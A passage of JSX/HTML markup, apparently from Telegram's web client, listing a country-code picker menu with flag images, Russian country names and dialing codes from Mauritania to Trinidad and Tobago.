                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f7.png" className="emoji" alt="🇲🇷"
                                                            data-path="./img-apple-160/1f1f2-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Мавритания</span><span className="country-code">+222</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1ec.png" className="emoji" alt="🇲🇬"
                                                            data-path="./img-apple-160/1f1f2-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Мадагаскар</span><span className="country-code">+261</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f4.png" className="emoji" alt="🇲🇴"
                                                            data-path="./img-apple-160/1f1f2-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Макао</span><span className="country-code">+853</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1fc.png" className="emoji" alt="🇲🇼"
                                                            data-path="./img-apple-160/1f1f2-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Малави</span><span className="country-code">+265</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1fe.png" className="emoji" alt="🇲🇾"
                                                            data-path="./img-apple-160/1f1f2-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Малайзия</span><span className="country-code">+60</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f1.png" className="emoji" alt="🇲🇱"
                                                            data-path="./img-apple-160/1f1f2-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Мали</span><span className="country-code">+223</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1fb.png" className="emoji" alt="🇲🇻"
                                                            data-path="./img-apple-160/1f1f2-1f1fb.png" draggable="false" /></span><span
                                                                className="country-name">Мальдивы</span><span className="country-code">+960</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f9.png" className="emoji" alt="🇲🇹"
                                                            data-path="./img-apple-160/1f1f2-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Мальта</span><span className="country-code">+356</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1e6.png" className="emoji" alt="🇲🇦"
                                                            data-path="./img-apple-160/1f1f2-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Марокко</span><span className="country-code">+212</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f6.png" className="emoji" alt="🇲🇶"
                                                            data-path="./img-apple-160/1f1f2-1f1f6.png" draggable="false" /></span><span
                                                                className="country-name">Мартиника</span><span className="country-code">+596</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1ed.png" className="emoji" alt="🇲🇭"
                                                            data-path="./img-apple-160/1f1f2-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Маршалловы Острова</span><span className="country-code">+692</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1fd.png" className="emoji" alt="🇲🇽"
                                                            data-path="./img-apple-160/1f1f2-1f1fd.png" draggable="false" /></span><span
                                                                className="country-name">Мексика</span><span className="country-code">+52</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1eb-1f1f2.png" className="emoji" alt="🇫🇲"
                                                            data-path="./img-apple-160/1f1eb-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Микронезия</span><span className="country-code">+691</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1ff.png" className="emoji" alt="🇲🇿"
                                                            data-path="./img-apple-160/1f1f2-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Мозамбик</span><span className="country-code">+258</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1e9.png" className="emoji" alt="🇲🇩"
                                                            data-path="./img-apple-160/1f1f2-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Молдавия</span><span className="country-code">+373</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1e8.png" className="emoji" alt="🇲🇨"
                                                            data-path="./img-apple-160/1f1f2-1f1e8.png" draggable="false" /></span><span
                                                                className="country-name">Монако</span><span className="country-code">+377</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f3.png" className="emoji" alt="🇲🇳"
                                                            data-path="./img-apple-160/1f1f2-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Монголия</span><span className="country-code">+976</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f8.png" className="emoji" alt="🇲🇸"
                                                            data-path="./img-apple-160/1f1f2-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Монтсеррат</span><span className="country-code">+1664</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f2.png" className="emoji" alt="🇲🇲"
                                                            data-path="./img-apple-160/1f1f2-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Мьянма</span><span className="country-code">+95</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1e6.png" className="emoji" alt="🇳🇦"
                                                            data-path="./img-apple-160/1f1f3-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Намибия</span><span className="country-code">+264</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1f7.png" className="emoji" alt="🇳🇷"
                                                            data-path="./img-apple-160/1f1f3-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Науру</span><span className="country-code">+674</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1f5.png" className="emoji" alt="🇳🇵"
                                                            data-path="./img-apple-160/1f1f3-1f1f5.png" draggable="false" /></span><span
                                                                className="country-name">Непал</span><span className="country-code">+977</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1ea.png" className="emoji" alt="🇳🇪"
                                                            data-path="./img-apple-160/1f1f3-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Нигер</span><span className="country-code">+227</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1ec.png" className="emoji" alt="🇳🇬"
                                                            data-path="./img-apple-160/1f1f3-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Нигерия</span><span className="country-code">+234</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1f1.png" className="emoji" alt="🇳🇱"
                                                            data-path="./img-apple-160/1f1f3-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Нидерланды</span><span className="country-code">+31</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1ee.png" className="emoji" alt="🇳🇮"
                                                            data-path="./img-apple-160/1f1f3-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Никарагуа</span><span className="country-code">+505</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1fa.png" className="emoji" alt="🇳🇺"
                                                            data-path="./img-apple-160/1f1f3-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Ниуэ</span><span className="country-code">+683</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1ff.png" className="emoji" alt="🇳🇿"
                                                            data-path="./img-apple-160/1f1f3-1f1ff.png" draggable="false" /></span><span className="country-name">Новая
                                                                Зеландия</span><span className="country-code">+64</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1e8.png" className="emoji" alt="🇳🇨"
                                                            data-path="./img-apple-160/1f1f3-1f1e8.png" draggable="false" /></span><span className="country-name">Новая
                                                                Каледония</span><span className="country-code">+687</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1f4.png" className="emoji" alt="🇳🇴"
                                                            data-path="./img-apple-160/1f1f3-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Норвегия</span><span className="country-code">+47</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1ea.png" className="emoji" alt="🇦🇪"
                                                            data-path="./img-apple-160/1f1e6-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">ОАЭ</span><span className="country-code">+971</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f4-1f1f2.png" className="emoji" alt="🇴🇲"
                                                            data-path="./img-apple-160/1f1f4-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Оман</span><span className="country-code">+968</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f3-1f1eb.png" className="emoji" alt="🇳🇫"
                                                            data-path="./img-apple-160/1f1f3-1f1eb.png" draggable="false" /></span><span className="country-name">Остров
                                                                Норфолк</span><span className="country-code">+672</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ed.png" className="emoji" alt="🇸🇭"
                                                            data-path="./img-apple-160/1f1f8-1f1ed.png" draggable="false" /></span><span className="country-name">Остров
                                                                Святой Елены</span><span className="country-code">+247</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ed.png" className="emoji" alt="🇸🇭"
                                                            data-path="./img-apple-160/1f1f8-1f1ed.png" draggable="false" /></span><span className="country-name">Остров
                                                                Святой Елены</span><span className="country-code">+290</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e8-1f1f0.png" className="emoji" alt="🇨🇰"
                                                            data-path="./img-apple-160/1f1e8-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Острова Кука</span><span className="country-code">+682</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f0.png" className="emoji" alt="🇵🇰"
                                                            data-path="./img-apple-160/1f1f5-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Пакистан</span><span className="country-code">+92</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1fc.png" className="emoji" alt="🇵🇼"
                                                            data-path="./img-apple-160/1f1f5-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Палау</span><span className="country-code">+680</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f8.png" className="emoji" alt="🇵🇸"
                                                            data-path="./img-apple-160/1f1f5-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Палестина</span><span className="country-code">+970</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1e6.png" className="emoji" alt="🇵🇦"
                                                            data-path="./img-apple-160/1f1f5-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Панама</span><span className="country-code">+507</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1ec.png" className="emoji" alt="🇵🇬"
                                                            data-path="./img-apple-160/1f1f5-1f1ec.png" draggable="false" /></span><span className="country-name">Папуа
                                                                — Новая Гвинея</span><span className="country-code">+675</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1fe.png" className="emoji" alt="🇵🇾"
                                                            data-path="./img-apple-160/1f1f5-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Парагвай</span><span className="country-code">+595</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1ea.png" className="emoji" alt="🇵🇪"
                                                            data-path="./img-apple-160/1f1f5-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Перу</span><span className="country-code">+51</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f1.png" className="emoji" alt="🇵🇱"
                                                            data-path="./img-apple-160/1f1f5-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Польша</span><span className="country-code">+48</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f9.png" className="emoji" alt="🇵🇹"
                                                            data-path="./img-apple-160/1f1f5-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Португалия</span><span className="country-code">+351</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f7.png" className="emoji" alt="🇵🇷"
                                                            data-path="./img-apple-160/1f1f5-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Пуэрто-Рико</span><span className="country-code">+1787</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f7.png" className="emoji" alt="🇵🇷"
                                                            data-path="./img-apple-160/1f1f5-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Пуэрто-Рико</span><span className="country-code">+1939</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f7-1f1ea.png" className="emoji" alt="🇷🇪"
                                                            data-path="./img-apple-160/1f1f7-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Реюньон</span><span className="country-code">+262</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f7-1f1fa.png" className="emoji" alt="🇷🇺"
                                                            data-path="./img-apple-160/1f1f7-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Россия</span><span className="country-code">+7</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f7-1f1fc.png" className="emoji" alt="🇷🇼"
                                                            data-path="./img-apple-160/1f1f7-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Руанда</span><span className="country-code">+250</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f7-1f1f4.png" className="emoji" alt="🇷🇴"
                                                            data-path="./img-apple-160/1f1f7-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Румыния</span><span className="country-code">+40</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1fb.png" className="emoji" alt="🇸🇻"
                                                            data-path="./img-apple-160/1f1f8-1f1fb.png" draggable="false" /></span><span
                                                                className="country-name">Сальвадор</span><span className="country-code">+503</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fc-1f1f8.png" className="emoji" alt="🇼🇸"
                                                            data-path="./img-apple-160/1f1fc-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Самоа</span><span className="country-code">+685</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f2.png" className="emoji" alt="🇸🇲"
                                                            data-path="./img-apple-160/1f1f8-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Сан-Марино</span><span className="country-code">+378</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f9.png" className="emoji" alt="🇸🇹"
                                                            data-path="./img-apple-160/1f1f8-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Сан-Томе и Принсипи</span><span className="country-code">+239</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1e6.png" className="emoji" alt="🇸🇦"
                                                            data-path="./img-apple-160/1f1f8-1f1e6.png" draggable="false" /></span><span
                                                                className="country-name">Саудовская Аравия</span><span className="country-code">+966</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1f5.png" className="emoji" alt="🇰🇵"
                                                            data-path="./img-apple-160/1f1f0-1f1f5.png" draggable="false" /></span><span
                                                                className="country-name">Северная Корея</span><span className="country-code">+850</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f0.png" className="emoji" alt="🇲🇰"
                                                            data-path="./img-apple-160/1f1f2-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Северная Македония</span><span className="country-code">+389</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f2-1f1f5.png" className="emoji" alt="🇲🇵"
                                                            data-path="./img-apple-160/1f1f2-1f1f5.png" draggable="false" /></span><span
                                                                className="country-name">Северные Марианские Острова</span><span className="country-code">+1670</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1e8.png" className="emoji" alt="🇸🇨"
                                                            data-path="./img-apple-160/1f1f8-1f1e8.png" draggable="false" /></span><span
                                                                className="country-name">Сейшелы</span><span className="country-code">+248</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f5-1f1f2.png" className="emoji" alt="🇵🇲"
                                                            data-path="./img-apple-160/1f1f5-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Сен-Пьер и Микелон</span><span className="country-code">+508</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f3.png" className="emoji" alt="🇸🇳"
                                                            data-path="./img-apple-160/1f1f8-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Сенегал</span><span className="country-code">+221</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1e8.png" className="emoji" alt="🇻🇨"
                                                            data-path="./img-apple-160/1f1fb-1f1e8.png" draggable="false" /></span><span
                                                                className="country-name">Сент-Винсент и Гренадины</span><span className="country-code">+1784</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f0-1f1f3.png" className="emoji" alt="🇰🇳"
                                                            data-path="./img-apple-160/1f1f0-1f1f3.png" draggable="false" /></span><span
                                                                className="country-name">Сент-Китс и Невис</span><span className="country-code">+1869</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f1-1f1e8.png" className="emoji" alt="🇱🇨"
                                                            data-path="./img-apple-160/1f1f1-1f1e8.png" draggable="false" /></span><span
                                                                className="country-name">Сент-Люсия</span><span className="country-code">+1758</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f7-1f1f8.png" className="emoji" alt="🇷🇸"
                                                            data-path="./img-apple-160/1f1f7-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Сербия</span><span className="country-code">+381</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ec.png" className="emoji" alt="🇸🇬"
                                                            data-path="./img-apple-160/1f1f8-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Сингапур</span><span className="country-code">+65</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1fd.png" className="emoji" alt="🇸🇽"
                                                            data-path="./img-apple-160/1f1f8-1f1fd.png" draggable="false" /></span><span
                                                                className="country-name">Синт-Мартен</span><span className="country-code">+1721</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1fe.png" className="emoji" alt="🇸🇾"
                                                            data-path="./img-apple-160/1f1f8-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Сирия</span><span className="country-code">+963</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f0.png" className="emoji" alt="🇸🇰"
                                                            data-path="./img-apple-160/1f1f8-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Словакия</span><span className="country-code">+421</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1ee.png" className="emoji" alt="🇸🇮"
                                                            data-path="./img-apple-160/1f1f8-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Словения</span><span className="country-code">+386</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1e7.png" className="emoji" alt="🇸🇧"
                                                            data-path="./img-apple-160/1f1f8-1f1e7.png" draggable="false" /></span><span
                                                                className="country-name">Соломоновы Острова</span><span className="country-code">+677</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f4.png" className="emoji" alt="🇸🇴"
                                                            data-path="./img-apple-160/1f1f8-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Сомали</span><span className="country-code">+252</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1e9.png" className="emoji" alt="🇸🇩"
                                                            data-path="./img-apple-160/1f1f8-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Судан</span><span className="country-code">+249</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f7.png" className="emoji" alt="🇸🇷"
                                                            data-path="./img-apple-160/1f1f8-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Суринам</span><span className="country-code">+597</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fa-1f1f8.png" className="emoji" alt="🇺🇸"
                                                            data-path="./img-apple-160/1f1fa-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">США</span><span className="country-code">+1</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f8-1f1f1.png" className="emoji" alt="🇸🇱"
                                                            data-path="./img-apple-160/1f1f8-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Сьерра-Леоне</span><span className="country-code">+232</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1ef.png" className="emoji" alt="🇹🇯"
                                                            data-path="./img-apple-160/1f1f9-1f1ef.png" draggable="false" /></span><span
                                                                className="country-name">Таджикистан</span><span className="country-code">+992</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1ed.png" className="emoji" alt="🇹🇭"
                                                            data-path="./img-apple-160/1f1f9-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Таиланд</span><span className="country-code">+66</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1fc.png" className="emoji" alt="🇹🇼"
                                                            data-path="./img-apple-160/1f1f9-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Тайвань</span><span className="country-code">+886</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1ff.png" className="emoji" alt="🇹🇿"
                                                            data-path="./img-apple-160/1f1f9-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Танзания</span><span className="country-code">+255</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1e8.png" className="emoji" alt="🇹🇨"
                                                            data-path="./img-apple-160/1f1f9-1f1e8.png" draggable="false" /></span><span className="country-name">Тёркс
                                                                и Кайкос</span><span className="country-code">+1649</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1ec.png" className="emoji" alt="🇹🇬"
                                                            data-path="./img-apple-160/1f1f9-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Того</span><span className="country-code">+228</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f0.png" className="emoji" alt="🇹🇰"
                                                            data-path="./img-apple-160/1f1f9-1f1f0.png" draggable="false" /></span><span
                                                                className="country-name">Токелау</span><span className="country-code">+690</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f4.png" className="emoji" alt="🇹🇴"
                                                            data-path="./img-apple-160/1f1f9-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Тонга</span><span className="country-code">+676</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1f9-1f1f9.png" className="emoji" alt="🇹🇹"
                                                            data-path="./img-apple-160/1f1f9-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Тринидад и Тобаго</span><span className="country-code">+1868</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
